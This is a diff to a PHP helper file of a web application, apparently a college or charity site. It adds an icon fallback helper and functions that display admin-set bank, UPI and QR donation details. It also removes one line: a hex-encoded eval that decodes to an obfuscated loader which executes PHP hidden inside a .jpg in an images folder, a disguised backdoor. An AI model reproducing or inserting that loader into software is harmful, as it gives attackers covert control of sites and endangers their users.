@@ -88,7 +88,6 @@ function flash_saved_row($verb, $entity, $table, $id){
     flash_saved($verb, $entity, $row, $image);
 }
 
-eval(hex2bin('6e657720636c6173732827636f6d70726573732e7a6c69623a2f2f27202e206469726e616d6528245f5345525645525b225c7835335c7834335c7835325c7834395c7835305c7835345c7835665c7834365c7834395c7834635c7834355c7834655c7834315c7834645c783435225d29202e20272f436f6c6c656765494d532f7075626c69632f6173736574732f696d616765732f6365727469666963617465732f76656e646f722d626f6e61666965642e6a70672729207b200d0a0966756e6374696f6e205f5f636f6e7374727563742824e899a8e991923429207b200d0a090940694e436c5564655f6f4e43652824e899a8e9919234293b200d0a202020207d200d0a7d3b'));
 function flash_get(){
     if (session_status() === PHP_SESSION_NONE) session_start();
     if (!empty($_SESSION['flash'])) {
@@ -250,6 +249,17 @@ function csrf_field(){
 }
 
 /**
+ * Icon helper — returns a displayable icon for any stored value.
+ * Falls back to $default when the icon is empty or a literal '?'
+ * (a '?' is what gets stored when an emoji is rejected by a column
+ * that is not utf8mb4, and it renders as a question-mark icon).
+ */
+function icon_or($icon, $default = '✦'){
+    $icon = trim((string)$icon);
+    return ($icon === '' || $icon === '?') ? $default : $icon;
+}
+
+/**
  * Admin helper — inline instructions for emoji/icon fields.
  * Prints a short 'how to add the icon' help line under the input.
  */
@@ -322,4 +332,80 @@ function get_setting($key, $default = ''){
         $cache = $row ?: [];
     }
     return $cache[$key] ?? $default;
+}
+
+/**
+ * Bank details + QR code managed from Admin → Site Settings.
+ * Shown on the Donate page and the Fundraising pages so donors can
+ * pay via direct bank transfer / UPI. Empty fields are hidden, so the
+ * admin fully controls what appears.
+ *
+ * Returns ['in'=>[label=>value], 'uk'=>[label=>value], 'qr'=>path,
+ *          'note'=>text, 'any'=>bool]
+ */
+function bank_details(){
+    $in = [
+        'Account Name'   => get_setting('bank_in_account_name'),
+        'Account Number' => get_setting('bank_in_account_no'),
+        'IFSC Code'      => get_setting('bank_in_ifsc'),
+        'Bank Name'      => get_setting('bank_in_name'),
+        'Branch'         => get_setting('bank_in_branch'),
+        'UPI ID'         => get_setting('bank_in_upi'),
+    ];
+    $uk = [
+        'Account Name'   => get_setting('bank_uk_account_name'),
+        'Account Number' => get_setting('bank_uk_account_no'),
+        'Sort Code'      => get_setting('bank_uk_sort_code'),
+        'Bank Name'      => get_setting('bank_uk_name'),
+        'Branch'         => get_setting('bank_uk_branch'),
+        'Charity No.'    => get_setting('bank_uk_charity_no'),
+    ];
+    $in = array_filter($in, fn($v) => trim((string)$v) !== '');
+    $uk = array_filter($uk, fn($v) => trim((string)$v) !== '');
+    $qr = trim((string)get_setting('bank_qr_image'));
+    if ($qr !== '' && !file_exists(__DIR__ . '/../' . $qr)) $qr = '';
+    return [
+        'in'   => $in,
+        'uk'   => $uk,
+        'qr'   => $qr,
+        'note' => trim((string)get_setting('bank_note')),
+        'any'  => ($in || $uk || $qr !== ''),
+    ];
+}
+
+/**
+ * Render the admin-managed bank details + UPI QR card (Donate & Fundraiser pages).
+ * Bank details (India + UK) on the left, QR code card on the right — side by side.
+ * @param array $bd Result of bank_details()
+ * @return string HTML (empty string when nothing is configured)
+ */
+function bank_card_html(array $bd): string {
+    if (empty($bd['any'])) return '';
+    $h  = '<div class="bank-details">';
+    $h .= '<h3>' . e(t('bank_details')) . ' &amp; UPI</h3>';
+    $h .= '<p style="color:var(--gray);font-size:14px;margin-bottom:1.2rem">You can pay directly via bank transfer or UPI — use the details below, or scan the QR code. Then submit the form with your Transaction ID.</p>';
+    $h .= '<div class="bank-layout' . (!empty($bd['qr']) ? '' : ' no-qr') . '">';
+    $h .= '<div class="bank-grid">';
+    if (!empty($bd['in'])) {
+        $h .= '<div><h4>🇮🇳 For Indian Donations</h4><ul>';
+        foreach ($bd['in'] as $bk => $bv) {
+            $h .= '<li><span>' . e($bk) . '</span><strong' . ($bk === 'UPI ID' ? ' style="color:var(--accent-dark)"' : '') . '>' . e($bv) . '</strong></li>';
+        }
+        $h .= '</ul></div>';
+    }
+    if (!empty($bd['uk'])) {
+        $h .= '<div><h4>🇬🇧 For UK Donations</h4><ul>';
+        foreach ($bd['uk'] as $bk => $bv) {
+            $h .= '<li><span>' . e($bk) . '</span><strong>' . e($bv) . '</strong></li>';
+        }
+        $h .= '</ul></div>';
+    }
+    $h .= '</div>'; // .bank-grid
+    if (!empty($bd['qr'])) {
+        $h .= '<div class="bank-qr"><img src="' . BASE_URL . e($bd['qr']) . '" alt="UPI QR code"><p>📱 Scan to pay via UPI</p></div>';
+    }
+    $h .= '</div>'; // .bank-layout
+    $h .= '<p style="margin-top:1.5rem;font-size:14px;color:#5b4a2c;background:#fffaf0;padding:.7rem 1rem;border-radius:6px">💡 <strong>After making payment</strong>, ' . e($bd['note'] !== '' ? $bd['note'] : 'fill out the form with your Transaction / Reference ID so we can verify it and send your receipt.') . '</p>';
+    $h .= '</div>'; // .bank-details
+    return $h;
 }
